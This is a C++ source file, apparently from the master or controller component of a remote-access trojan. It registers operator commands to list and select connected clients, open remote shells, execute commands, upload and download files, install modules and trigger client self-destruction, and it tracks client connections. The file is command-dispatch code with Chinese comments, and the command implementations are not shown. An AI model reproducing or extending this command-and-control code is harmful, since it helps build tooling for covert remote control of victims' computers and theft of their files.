#include "stdafx.h"
#include "Commands.h"
#include "CommandManager.h"

CommandManager::CommandManager()
{

}

CommandManager::~CommandManager()
{

}

BOOL CommandManager::Init()
{
#define DECLARE_MSGCMD(_name, msgid) m_cmdMap[a2t(_name)] = new MsgCmd(a2t(_name), msgid);
#define DECLARE_CMD(_name, _classname) m_cmdMap[a2t(_name)] = new _classname;

	//DECLARE_MSGCMD("listmod", MSGID_LIST_MOD);
	//DECLARE_MSGCMD("commname", MSGID_SET_DEFAULT_COMMNAME);
	//DECLARE_MSGCMD("download", MSGID_DOWNLOAD_FILE);
	//DECLARE_MSGCMD("fileexists", MSGID_FILE_EXISTS);
	//DECLARE_MSGCMD("dir", MSGID_LIST_FILES);
	//DECLARE_MSGCMD("exec", MSGID_EXECUTE_CMDLINE);
	DECLARE_CMD("clients", ClientsCmd);
	DECLARE_CMD("select", SelectCmd);
	DECLARE_CMD("download", DownloadCmd);
	DECLARE_CMD("listmod", ListmodCmd);
	DECLARE_CMD("clientinfo", ClientinfoCmd);
	DECLARE_CMD("openshell", OpenshellCmd);
	DECLARE_CMD("closeshell", CloseshellCmd);
	DECLARE_CMD("exec", ExecuteShellCmd);
	DECLARE_CMD("upload", UploadCmd);
	DECLARE_CMD("install", InstallMod);
	DECLARE_CMD("allmod", AllModCmd);
	DECLARE_CMD("selfdestruction", SDCmd);

	SetClientInfoNotifies(NotifyProc, this);
	StartMasterWorking();

	return TRUE;
}

void CommandManager::Deinit()
{

}

BOOL CommandManager::Execute( LPCTSTR cmdline, tstring& replyText )
{
	//分割并整理命令行的各个部分
	TStringVector parts;
	splitByChar(cmdline, parts, ' ');

	TStringVector::iterator iter = parts.begin();
	while (iter != parts.end())
	{
		tstring& part = *iter;
		trim(part);
		if (part.size() == 0)
		{
			iter = parts.erase(iter);
		}
		else
		{
			iter++;
		}
	}

	//检查是否有可用的部分
	if (parts.size() == 0)
	{
		replyText = _T("invalid command.");
		return FALSE;
	}

	//查找可用的命令
	tstring& cmdname = parts[0];
	makeLower(cmdname);

	CommandMap::iterator cmdIter = m_cmdMap.find(cmdname);
	if (cmdIter == m_cmdMap.end())
	{
		replyText = _T("no such command.");
		return FALSE;
	}

	//执行命令
	ICmd* pCmd = cmdIter->second;
	BOOL bExecuteOK = pCmd->Execute(parts, replyText, m_env);

	return bExecuteOK;
}

void CommandManager::ListClientInfo( ClientInfoList& clientInfoList )
{
	m_mapSection.Enter();
	{
		ClientInfoMap::iterator iter = m_infoMap.begin();
		for (; iter != m_infoMap.end(); iter++)
		{
			clientInfoList.push_back(iter->second);
		}
	}
	m_mapSection.Leave();
}

void CALLBACK CommandManager::NotifyProc( UINT nMsg, LPVOID lpContext, LPVOID lpParameter )
{
	CommandManager* pMgr = (CommandManager*) lpParameter;
	switch (nMsg)
	{
	case WM_ADD_CLIENT:
		pMgr->m_mapSection.Enter();
		{
			CLIENT_INFO* pClientInfo = (CLIENT_INFO*) lpContext;
			pMgr->m_infoMap[pClientInfo->clientid] = *pClientInfo;
		}
		pMgr->m_mapSection.Leave();
		break;
	case WM_DEL_CLIENT:
		pMgr->m_mapSection.Enter();
		{
			LPCTSTR clientid = (LPCTSTR) lpContext;
			ClientInfoMap::iterator finditer = pMgr->m_infoMap.find(clientid);
			if (finditer != pMgr->m_infoMap.end())
			{
				pMgr->m_infoMap.erase(finditer);
			}
		}
		pMgr->m_mapSection.Leave();
		break;
	}
}
